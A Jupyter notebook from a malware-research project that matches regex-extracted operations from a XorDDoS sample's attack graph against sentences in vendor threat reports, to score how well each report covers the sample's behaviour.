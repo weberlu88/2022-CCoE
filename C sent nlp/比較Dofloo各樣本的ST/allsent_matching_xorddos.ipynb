{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "import os\n",
    "from os import listdir\n",
    "from os.path import isfile, join\n",
    "from pathlib import Path\n",
    "import pandas as pd\n",
    "import pickle\n",
    "from typing import Dict, List, get_type_hints\n",
    "from styleframe import StyleFrame, Styler\n",
    "from IPython.display import display\n",
    "\n",
    "''' 自己寫的模組 '''\n",
    "from cc_regex_script import RegexMatchResult, RegexMaster \n",
    "from cc_nlp_script import find_verb_of_vocab, OperationMode, OperationEvaluator\n",
    "from cc_module_cust import AttackGraph, Node, Edge, FileTable #, build"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Load 所有 Dofloo 的 object，計算並儲存其 regex"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "family Xorddos has numOfSample 21, first is 07c070b717a23453a2b71c7582d6a928\n",
      "samplename: ['0aefb67c01a24d05351b093455203fa2']\n"
     ]
    }
   ],
   "source": [
    "family = 'Xorddos' # Dofloo Xorddos\n",
    "\n",
    "sample_info = pd.read_csv('../../C malware info/sample_info.csv')\n",
    "dofloo_info = sample_info[(sample_info['family'] == family) & \n",
    "            (~sample_info['filename'].isin(['8845355172c485813872f1bb1834de15.bin']))]\n",
    "samplename_lst = dofloo_info['filename'].to_list()\n",
    "samplename_lst = [name.split('.')[0] for name in samplename_lst]\n",
    "print(f\"family {family} has numOfSample {len(samplename_lst)}, first is {samplename_lst[0]}\")\n",
    "\n",
    "if family == 'Dofloo':\n",
    "    samplename_lst = ['0046a78514a658b9b7a4e29e8581f85b'] # 只先使用這個 dof sample\n",
    "if family == 'Xorddos':\n",
    "    samplename_lst = ['0aefb67c01a24d05351b093455203fa2'] # 只先使用這個 xor sample\n",
    "\n",
    "print('samplename:', samplename_lst)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "True\n",
      "{<OP act=a, obj=a>}\n"
     ]
    }
   ],
   "source": [
    "def prettifyName(item:str) -> str:\n",
    "    pretty_name = {\n",
    "        r\"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\": \"ip_addr\",\n",
    "        r\"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+\": \"ip_addr+port\",\n",
    "        r\"0x[0-9a-zA-Z]{8}\": \"mem_addr\",\n",
    "        r\"permission:{0,1}[0-9]{0,4}\": \"permission_id\"\n",
    "    }\n",
    "    changed = pretty_name.get(item, None)\n",
    "    if changed:\n",
    "        return changed\n",
    "    return item\n",
    "\n",
    "class OperationPair:\n",
    "    SYSCALL = 0\n",
    "    VERB = 1\n",
    "\n",
    "    def __init__(self, action:str, object:str, type:int=0, subject:str=None, step_number:int=None, original_object=None, original_sentence=None):\n",
    "        self.object:str = object # regex\n",
    "        self.action:str = action # verb or syscall\n",
    "        self.type:int = type\n",
    "        self.subject:str = subject\n",
    "        self.step_number:int = step_number\n",
    "        self.original_object:str = original_object # can store original matched word (object) from CTD\n",
    "        self.original_sentence:str = original_sentence # can store the mathced sentence\n",
    "        pass\n",
    "\n",
    "    def __eq__(self, other): \n",
    "        if not isinstance(other, OperationPair):\n",
    "            # don't attempt to compare against unrelated types\n",
    "            return NotImplemented\n",
    "        # Same if <action, object> pair is same (type is not consider yet)\n",
    "        return self.action == other.action and self.object == other.object\n",
    "\n",
    "    def __hash__(self) -> int:\n",
    "        # necessary for instances to behave sanely in dicts and sets.\n",
    "        return hash((self.action, self.object))\n",
    "\n",
    "    def __str__(self) -> str:\n",
    "        if self.step_number:\n",
    "            return f\"<OP{self.step_number:>2} act={self.action}, obj={prettifyName(self.object)}>\"\n",
    "        return f\"<OP act={self.action}, obj={prettifyName(self.object)}>\"\n",
    "    def __repr__(self) -> str:\n",
    "        return str(self)\n",
    "    def getSentStr(self) -> str:\n",
    "        '''return string contains original_object & flat_sentence'''\n",
    "        flat_sentence = \" \".join(self.original_sentence.splitlines())\n",
    "        return f\"<OP{self.step_number:>2} act={self.action}, obj={prettifyName(self.original_object)}, sent={flat_sentence}>\"\n",
    "        \n",
    "# test case\n",
    "p_aa = OperationPair('a','a')\n",
    "p_aaz = OperationPair('a','a')\n",
    "p_ab = OperationPair('a','b')\n",
    "\n",
    "print(p_aa == p_aaz) # True\n",
    "print(set([p_aa, p_aaz])) # one element\n",
    "\n",
    "def construct_sample_OPset(step_list: list, keep_src_node=False, debug=False, rt_order=True) -> set:\n",
    "    '''return a list of OPset. RegexMaster and family are gobal variable.'''\n",
    "    if debug:\n",
    "        print('step_list len:', len(set(step_list)))\n",
    "    OPlst_raw = list((src_node.name, dst_node.name, syscall) for (src_node, dst_node, syscall) in step_list) # object is raw\n",
    "    OPset_raw = list(dict.fromkeys(OPlst_raw))\n",
    "    if debug:\n",
    "        print('OPlst_raw len:', len(OPlst_raw)) # why len is 123100? (while step_list len is 7775) (must be equal)\n",
    "        print(f\"OPlst_raw: {OPlst_raw[:10]}\")\n",
    "        print('OPset_raw len:', len(OPset_raw)) # len is 5925 for xor\n",
    "        print(f\"OPset_raw: {OPset_raw[:10]}\")\n",
    "    regexMaster = RegexMaster(familyname=family)\n",
    "    regex_pool = regexMaster.get_all_regex()\n",
    "    OPset = set()\n",
    "    OPset_ordered = list()\n",
    "    for (src_node, dst_node, syscall) in OPset_raw:\n",
    "        regex_dst_node_list = RegexMaster.find_spacial_token_with_regex(regex_pool, dst_node)\n",
    "        if regex_dst_node_list is None or len(regex_dst_node_list) == 0:\n",
    "            continue\n",
    "        for regex_result in regex_dst_node_list:\n",
    "            dst_node = regex_result.match_regex\n",
    "            step_number = len(OPset) + 1\n",
    "            if keep_src_node:\n",
    "                op = OperationPair(syscall, dst_node, subject=src_node, step_number=step_number)\n",
    "                OPset.add(op) # keep src_node in OP\n",
    "                if op not in OPset_ordered:\n",
    "                    OPset_ordered.append(op)\n",
    "            else:\n",
    "                op = OperationPair(syscall, dst_node, step_number=step_number)\n",
    "                OPset.add(op) # only dst_node, syscall in OP\n",
    "                if op not in OPset_ordered:\n",
    "                    OPset_ordered.append(op)\n",
    "    if debug:\n",
    "        print('OPset len:', len(OPset), 'OPset_ordered len:', len(OPset_ordered))\n",
    "    if rt_order:\n",
    "        return OPset, OPset_ordered\n",
    "    return OPset\n",
    "\n",
    "# def construct_sample_stepList(step_list: list, keep_src_node=False, debug=False) -> list:\n",
    "#     ''''''\n",
    "#     pass\n",
    "\n",
    "# test\n",
    "# sample_OPset = construct_sample_OPset(asg.step_list, debug=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exam: sample S1 matches 31 of regex\n",
      "Size of regex_pool: 31, size of total_used_regex: 0\n"
     ]
    }
   ],
   "source": [
    "class Sample:\n",
    "    def __init__(self, samplename:str, regex_set:set=None, special_token_dict=None, step_list=None) -> None:\n",
    "        self.samplename: str = samplename\n",
    "        self.regex_set: set = set()\n",
    "        if regex_set:\n",
    "            self.regex_set = regex_set\n",
    "        self.special_token_dict = {}\n",
    "        if special_token_dict:\n",
    "            self.special_token_dict: dict = special_token_dict # list of dict\n",
    "        if step_list:\n",
    "            self.step_list = step_list\n",
    "            OPset, OPset_ordered = construct_sample_OPset(step_list)\n",
    "            self.OPset: set[OperationPair] = OPset\n",
    "            self.OPset_ordered: list[OperationPair] = OPset_ordered # 依照出現順序排序的 OPset (元素相同順序不同)\n",
    "            self.OPset_sysOnly_ordered = [] # 尚未初始化 只儲存改變系統狀態的 OP 的物件\n",
    "            self.OPset_sysOnly_ordered_index = [] # 尚未初始化 只儲存改變系統狀態的 OP 的 index\n",
    "            del OPset, OPset_ordered\n",
    "        pass\n",
    "    def __repr__(self) -> str:\n",
    "        return f\"<Sample self.samplename>\"\n",
    "\n",
    "''' 讀取 ASG 中的 set_of_object (就是這個樣本的 special_token_dict)，並歸納樣本的 regex_set '''\n",
    "regexMaster = RegexMaster(familyname=family)\n",
    "regex_pool = regexMaster.get_all_regex()\n",
    "# total_used_regex = set()\n",
    "samples: list[Sample] = []\n",
    "for samplename in samplename_lst:\n",
    "    with open(f'../../C ASG statistics 1115ver/saved_pkl/{family}/{samplename}.pkl', 'rb') as inp:\n",
    "        asg: AttackGraph = pickle.load(inp) # asg.set_of_object is dict() (key:spacial token, value: type 首字大寫)\n",
    "        sample = Sample(samplename, special_token_dict=asg.set_of_object, step_list=asg.step_list)\n",
    "        sample.regex_set = set(regex_pool) # 直接使用志剛寫的作為這個樣本的 baseline\n",
    "        # for obj in sample.special_token_dict.keys():\n",
    "        #     matched_list: list[RegexMatchResult] = regexMaster.find_spacial_token(obj)\n",
    "        #     if matched_list:\n",
    "        #         # print(obj, matched_list)\n",
    "        #         [sample.regex_set.add(m.match_regex) for m in matched_list]\n",
    "        #         # [total_used_regex.add(m.match_regex) for m in matched_list]\n",
    "        # print('------', sample.regex_set)\n",
    "        # break\n",
    "        samples.append(sample)\n",
    "    # del asg\n",
    "print(f'Exam: sample S1 matches {len(samples[0].regex_set)} of regex')\n",
    "print(f'Size of regex_pool: {len(regex_pool)}, size of total_used_regex: {len(regexMaster.used_regex_set)}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "set()"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 只差這四個不在 asg set_of_object 中 {'0x[0-9a-zA-Z]{8}', 'GID', 'UID', 'port \\\\d{1,5}$'}\n",
    "set(regex_pool) - samples[0].regex_set"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "' Save result to txt file 沒事不要 run ! '"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "''' Save result to txt file 沒事不要 run ! '''\n",
    "# total_regex = set()\n",
    "# with open('./result/countof_regexset.txt', 'w', encoding='utf-8') as opf:\n",
    "#     # header\n",
    "#     opf.write('{:12s}'.format('Sample no.'))\n",
    "#     for i in range(len(samples)):\n",
    "#         if i+1 < 10:\n",
    "#             opf.write(f' S{i+1} ')\n",
    "#         else:\n",
    "#             opf.write(f'S{i+1} ')\n",
    "#     opf.write('\\n')\n",
    "#     # opf.write('{:12s}'.format('# of regex'))\n",
    "#     num_of_regex_string = '{:12s}'.format('# of regex')\n",
    "#     num_of_objects_string = '{:12s}'.format('# of object ') # 所有的類別喔! 無過濾\n",
    "#     for i in range(len(samples)):\n",
    "#         # opf.write(f'{len(samples[i].regex_set):>3} ')\n",
    "#         num_of_regex_string += f'{len(samples[i].regex_set):>3} '\n",
    "#         num_of_objects_string += f'{len(samples[i].special_token_dict):>3} '\n",
    "#     opf.write(num_of_objects_string+'\\n')\n",
    "#     opf.write(num_of_regex_string)\n",
    "#     opf.write('\\n{:12s}'.format('Sample hash'))\n",
    "#     for i in range(len(samples)):\n",
    "#         opf.write(f'{samples[i].samplename[:3]:>3} ')\n",
    "#     opf.write('\\n\\n')\n",
    "#     opf.write(f'Size of regex_pool: {len(regex_pool)}, size of total_used_regex: {len(regexMaster.used_regex_set)}\\n\\n')\n",
    "\n",
    "#     # content of each sample\n",
    "#     for i,s in enumerate(samples):\n",
    "#         content_1 = f\"S{i+1} has {len(s.regex_set)} of regex\\n\"\n",
    "#         content_2 = f\"regex_set: {s.regex_set}\\n\"\n",
    "#         content_3 = f\"special_token_dict: {s.special_token_dict.keys()}\\n\"\n",
    "#         opf.writelines([content_1, content_2, content_3])\n",
    "#         opf.write('\\n\\n')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Load Reports"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['Xorddos-Cdnetworks.csv',\n",
       " 'Xorddos-Crowdstrike.csv',\n",
       " 'Xorddos-Intezer.csv',\n",
       " 'Xorddos-Microsoft.csv',\n",
       " 'Xorddos-Trendmicro.csv',\n",
       " 'Xorddos-Trendmicro2.csv']"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "report_fir_path = '../../C parse report/sentence csvs/'\n",
    "# family, samplename, outputfolder = 'Xorddos', '???', './result'\n",
    "outputfolder = './result'\n",
    "\n",
    "def get_all_filenames(dir: str='./') -> list:\n",
    "    ''' traverse root directory, and list directories as dirs and files as files. Return filenames in rootdir. '''\n",
    "    files = [f for f in listdir(dir) if isfile(join(dir, f))]\n",
    "    files.sort()\n",
    "    return files\n",
    "\n",
    "xor_report_names = [f for f in get_all_filenames(report_fir_path) if f.startswith(family)] # 只選擇這個家族的報告\n",
    "xor_report_dfs = [pd.read_csv(f\"{report_fir_path}{f}\") for f in xor_report_names]\n",
    "xor_report_names"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Number</th>\n",
       "      <th>Content</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Sentence 1</td>\n",
       "      <td>understanding a xor.ddos attack\\n2月 17, 2021\\n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Sentence 2</td>\n",
       "      <td>xor.ddos is the name of the malware, not the a...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Sentence 3</td>\n",
       "      <td>it was detected in september 2014 and the anal...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Sentence 4</td>\n",
       "      <td>is a distributed denial-of-service attack from...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Sentence 5</td>\n",
       "      <td>in many ways it is and in this guide, we will ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>Sentence 6</td>\n",
       "      <td>what is xor.ddos malware?</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>Sentence 7</td>\n",
       "      <td>the traditional attack utilized the existing v...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>Sentence 8</td>\n",
       "      <td>however, xor.ddos makes windows pcs into zombi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>Sentence 9</td>\n",
       "      <td>the xor.ddos attack is used to defeat the netw...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>Sentence 10</td>\n",
       "      <td>this is a very serious threat to the network b...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>Sentence 11</td>\n",
       "      <td>in addition to these primary targets, the udp ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>Sentence 12</td>\n",
       "      <td>however, the xor.ddos attack uses the tcp, whi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>Sentence 13</td>\n",
       "      <td>a brute force attack tries many random passwor...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>Sentence 14</td>\n",
       "      <td>there are various types of brute force attacks...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>Sentence 15</td>\n",
       "      <td>origin of xor.ddos attacks\\n77.1 % of xor.ddos...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>Sentence 16</td>\n",
       "      <td>many large-scale cloud service providers were ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>Sentence 17</td>\n",
       "      <td>in addition, as ssh services (22/tcp) are bein...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>Sentence 18</td>\n",
       "      <td>countermeasures against xor.ddos attacks\\nthe ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>Sentence 19</td>\n",
       "      <td>syn is just a process to perform a 3-way hands...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>19</th>\n",
       "      <td>Sentence 20</td>\n",
       "      <td>if syn packets with data are detected, the xor...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>20</th>\n",
       "      <td>Sentence 21</td>\n",
       "      <td>in addition, it is good to use a syn cookie ag...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>21</th>\n",
       "      <td>Sentence 22</td>\n",
       "      <td>the syn cookie blocks syn spoofing effectively...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22</th>\n",
       "      <td>Sentence 23</td>\n",
       "      <td>the syn cookie does not require a certain time...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>23</th>\n",
       "      <td>Sentence 24</td>\n",
       "      <td>therefore, the syn cookie is a very effective ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>24</th>\n",
       "      <td>Sentence 25</td>\n",
       "      <td>alternatively, first syn drop can be a second ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25</th>\n",
       "      <td>Sentence 26</td>\n",
       "      <td>this technique works by saving the first syn p...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>26</th>\n",
       "      <td>Sentence 27</td>\n",
       "      <td>if the session request is normal, the same ip ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>27</th>\n",
       "      <td>Sentence 28</td>\n",
       "      <td>if the request is made for attack, another syn...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>28</th>\n",
       "      <td>Sentence 29</td>\n",
       "      <td>conclusion – get a ddos mitigation service\\na ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>29</th>\n",
       "      <td>Sentence 30</td>\n",
       "      <td>the content delivery network industry can prov...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>30</th>\n",
       "      <td>Sentence 31</td>\n",
       "      <td>as the services are cloud-based, the available...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31</th>\n",
       "      <td>Sentence 32</td>\n",
       "      <td>with these services, most companies will benef...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "         Number                                            Content\n",
       "0    Sentence 1  understanding a xor.ddos attack\\n2月 17, 2021\\n...\n",
       "1    Sentence 2  xor.ddos is the name of the malware, not the a...\n",
       "2    Sentence 3  it was detected in september 2014 and the anal...\n",
       "3    Sentence 4  is a distributed denial-of-service attack from...\n",
       "4    Sentence 5  in many ways it is and in this guide, we will ...\n",
       "5    Sentence 6                          what is xor.ddos malware?\n",
       "6    Sentence 7  the traditional attack utilized the existing v...\n",
       "7    Sentence 8  however, xor.ddos makes windows pcs into zombi...\n",
       "8    Sentence 9  the xor.ddos attack is used to defeat the netw...\n",
       "9   Sentence 10  this is a very serious threat to the network b...\n",
       "10  Sentence 11  in addition to these primary targets, the udp ...\n",
       "11  Sentence 12  however, the xor.ddos attack uses the tcp, whi...\n",
       "12  Sentence 13  a brute force attack tries many random passwor...\n",
       "13  Sentence 14  there are various types of brute force attacks...\n",
       "14  Sentence 15  origin of xor.ddos attacks\\n77.1 % of xor.ddos...\n",
       "15  Sentence 16  many large-scale cloud service providers were ...\n",
       "16  Sentence 17  in addition, as ssh services (22/tcp) are bein...\n",
       "17  Sentence 18  countermeasures against xor.ddos attacks\\nthe ...\n",
       "18  Sentence 19  syn is just a process to perform a 3-way hands...\n",
       "19  Sentence 20  if syn packets with data are detected, the xor...\n",
       "20  Sentence 21  in addition, it is good to use a syn cookie ag...\n",
       "21  Sentence 22  the syn cookie blocks syn spoofing effectively...\n",
       "22  Sentence 23  the syn cookie does not require a certain time...\n",
       "23  Sentence 24  therefore, the syn cookie is a very effective ...\n",
       "24  Sentence 25  alternatively, first syn drop can be a second ...\n",
       "25  Sentence 26  this technique works by saving the first syn p...\n",
       "26  Sentence 27  if the session request is normal, the same ip ...\n",
       "27  Sentence 28  if the request is made for attack, another syn...\n",
       "28  Sentence 29  conclusion – get a ddos mitigation service\\na ...\n",
       "29  Sentence 30  the content delivery network industry can prov...\n",
       "30  Sentence 31  as the services are cloud-based, the available...\n",
       "31  Sentence 32  with these services, most companies will benef..."
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xor_report_dfs[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 單篇文章的 Class 和 整個 Family 的 Class\n",
    "`baseline: Dict[str, list]` 改為 `regexMaster: RegexMaster`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "class ReportEvalModel:\n",
    "    def __init__(self, regex_set: set, sentences: pd.DataFrame, reportname:str=''):\n",
    "        self.regex_pool: set[str] = regex_set # 樣本or家族含有的 regex 集合\n",
    "        self.sentences = sentences # a df\n",
    "        self.reportname = reportname\n",
    "        cols = list(regex_pool)\n",
    "        self.match_tbl = pd.DataFrame([[0]*len(cols)]*len(sentences), columns=cols)\n",
    "        self.match_word:dict[(int,str), str] = dict() # key(idx_sent,regex) value(word:str)\n",
    "        self.match_regex = set()\n",
    "        self.doc_OPset:set[OperationPair] = set() # Set of doc's OperationalPair\n",
    "        self.match_doc_OPset:set[OperationPair] = set()\n",
    "        self.OPset_order_index = [] # 紀錄 ASG OP 的出現順序 (lifecycle)\n",
    "        self.SysOPset_order_index = [] # 只紀錄改變系統的\n",
    "        # self.asgSysOPset_order_index = []\n",
    "        # self.regexMaster = regexMaster # 其實應該用 class function 就不用傳入一個物件\n",
    "        self.match()\n",
    "\n",
    "    def match(self) -> None:\n",
    "        '''find baseline in sentences of report. Fill matching result in self.match_tbl.'''\n",
    "        sentence_list = self.sentences['Content']\n",
    "        for idx_sent, sent in enumerate(sentence_list):\n",
    "            # print(idx_sent, sent)\n",
    "            # find regexs in a sentence\n",
    "            matched_list: list[RegexMatchResult] = RegexMaster.find_spacial_token_with_regex(self.regex_pool, sent)\n",
    "            if not matched_list:\n",
    "                continue\n",
    "            for m in matched_list:\n",
    "                this_re = m.match_regex\n",
    "                matched_word = m.word\n",
    "                self.match_word[(idx_sent,this_re)] = m.word # 紀錄被 search 到的單字\n",
    "                # self.match_tbl.loc[idx_sent,this_re] = 1 # mark as found 節省空間\n",
    "                self.match_regex.add(this_re)\n",
    "                en_verb = find_verb_of_vocab(sent, m.word)\n",
    "                # print(f\"---\\nen_verb: {en_verb}, m.word: {m.word}, sent: {sent}\") # 列印所有動詞抓取情形\n",
    "                stepn = len(self.doc_OPset) + 1\n",
    "                if en_verb:\n",
    "                    self.doc_OPset.add(OperationPair(en_verb, this_re, type=OperationPair.VERB, original_object=m.word, \n",
    "                    step_number=stepn, original_sentence=sent)) # has verb\n",
    "                else:\n",
    "                    self.doc_OPset.add(OperationPair(None, this_re, type=OperationPair.VERB, original_object=m.word, step_number=stepn)) # no verb\n",
    "        pass\n",
    "    \n",
    "    def get_match_sentences(self) -> pd.DataFrame:\n",
    "        result = self.match_tbl.copy()\n",
    "        result['match'] = result.sum(axis=1)\n",
    "        return result\n",
    "    \n",
    "    def get_match_regexs(self) -> set:\n",
    "        return self.match_regex\n",
    "\n",
    "    def get_match_word(self, idx_sent:int, regex:str) -> str:\n",
    "        return self.match_word[(idx_sent, regex)]\n",
    "\n",
    "class FamilySet:\n",
    "    '''一個 malware family report 集合'''\n",
    "    def __init__(self, familyname:str, regexMaster: RegexMaster, sample: Sample=None):\n",
    "        self.familyname = familyname\n",
    "        self.regexMaster = regexMaster\n",
    "        self.num_of_used_regex = len(regexMaster.used_regex_set) # 這個家族含規則的總數量 (unoin by all samples)\n",
    "        self.sample = None\n",
    "        if sample:\n",
    "            self.sample = sample\n",
    "            self.num_of_used_regex = len(sample.regex_set) # 改以這個樣本規則的總數量為基準\n",
    "        self.rem_lst: List[ReportEvalModel] = [] # list of ReportEvalModel under this family\n",
    "        self.result_tbl = None\n",
    "\n",
    "    def add_rem(self, sentences: pd.DataFrame, reportname: str=''):\n",
    "        '''新增 report 到 FamilySet 中，需傳入文本和報告名稱，會沿用 FamilySet 的 baseline.'''\n",
    "        if self.sample:\n",
    "            rem = ReportEvalModel(list(self.sample.regex_set), sentences, reportname) # 基準是 Sample\n",
    "            self.rem_lst.append(rem)\n",
    "            return\n",
    "        rem = ReportEvalModel(self.regexMaster, sentences, reportname) # 基準是 Family union # need fix -> no first arg now\n",
    "        self.rem_lst.append(rem)\n",
    "\n",
    "    def calc_report_coverage_score(self, match_regexs: list[str], apply_weight=False) -> float:\n",
    "        '''計算這篇報告的 coverage_score，未處理分母為0之情形'''\n",
    "        if not apply_weight:\n",
    "            return len(match_regexs) / self.num_of_used_regex # 無權種的算法，分母是家族 wide\n",
    "        ''' 以下 有權重的算法尚未修改，必出 bug '''\n",
    "        # denominator = sum(self.regexMaster['weight']) # 分母\n",
    "        # numerator = 0 # 分子\n",
    "        # for b, w in zip(self.regexMaster['text'], self.regexMaster['weight']):\n",
    "        #     if b in match_baselines:\n",
    "        #         numerator += w\n",
    "        # return numerator/denominator\n",
    "\n",
    "    def show_result(self, apply_weight: bool=False, base_on_sample = True):\n",
    "        '''print and return result table. baselinse(x) * report(y).'''\n",
    "        column_names = ['report_name','ttl_match','coverage_score']\n",
    "        if base_on_sample:\n",
    "            column_names.extend(list(self.sample.regex_set))\n",
    "        else:\n",
    "            column_names.extend(list(regexMaster.used_regex_set))\n",
    "        result_tbl = pd.DataFrame([[0]*len(column_names)]*len(self.rem_lst), columns=column_names)\n",
    "        for i,rem in enumerate(self.rem_lst):\n",
    "            match_regexes = rem.get_match_regexs() # 這篇報告含有哪些 baseine:set\n",
    "            c_score = self.calc_report_coverage_score(match_regexes, apply_weight=apply_weight)\n",
    "            result_tbl.loc[i,'report_name'] = rem.reportname\n",
    "            result_tbl.loc[i,'ttl_match'] = len(match_regexes)\n",
    "            result_tbl.loc[i,'coverage_score'] = f'{c_score:.4}'\n",
    "            for b in match_regexes:\n",
    "                result_tbl.loc[i,b] = 1\n",
    "            print(rem.reportname, match_regexes)\n",
    "        display(result_tbl)\n",
    "        return result_tbl"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: 存檔每篇報告的 matched sentence (以樣本的 regex set 為基準)\n",
    "比較樣本間的辨別度，有 n 個樣本，就會跑 n 變，得出 n 個結果 (FanilySet)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os, psutil\n",
    "def print_mem_usage():\n",
    "    process = psutil.Process(os.getpid())\n",
    "    mem_usage = psutil.Process(os.getpid()).memory_info().rss / 1024 ** 2\n",
    "    print(f\"=== mem_usage: {mem_usage:.2f} MB ===\")  # in MiB \n",
    "\n",
    "def get_mem_usage() -> int:\n",
    "    # process = psutil.Process(os.getpid())\n",
    "    mem_usage = psutil.Process(os.getpid()).memory_info().rss / 1024 ** 2\n",
    "    return mem_usage\n",
    "\n",
    "def run_family_set_procedure(sample: Sample) -> FamilySet:\n",
    "    # family, regexMaster is global variable\n",
    "    fset = FamilySet(family, regexMaster, sample=sample)\n",
    "    for i,rdf in enumerate(xor_report_dfs):\n",
    "        # rem = ReportEvalModel(base_data, rdf, dofloo_report_names[i])\n",
    "        fset.add_rem(rdf, xor_report_names[i])\n",
    "    # result_tbl = fset.show_result(apply_weight=False)\n",
    "    # result_tbl.to_csv(f'{outputfolder}/{family}_{sample.samplename[:3]}_FamilySet_by_Regex.csv', index=False)\n",
    "    # print(f\"Sample {sample.samplename[:3]} has ttl_match {result_tbl['ttl_match'].sum()} on all documents.\") \n",
    "\n",
    "    # Calculate metrics\n",
    "    print_mem_usage()\n",
    "    print(f\"asg_object: {set([op.object for op in sample.OPset])}\\n\")\n",
    "    fset.sample.OPset_sysOnly_ordered = [op for op in sample.OPset if op.object.find('/etc') != -1]\n",
    "    fset.sample.OPset_sysOnly_ordered_index = [sample.OPset_ordered.index(op) for op in fset.sample.OPset_sysOnly_ordered]\n",
    "    for idx_rem, rem in enumerate(fset.rem_lst):\n",
    "        # asg_object = set([op.object for op in sample.OPset])\n",
    "        # ctd_object = set([op.object for op in rem.doc_OPset])\n",
    "        if rem.reportname == 'Xorddos-Microsoft.csv': # 除錯用\n",
    "            continue\n",
    "        print(f\"\\nSample {rem.reportname}\")\n",
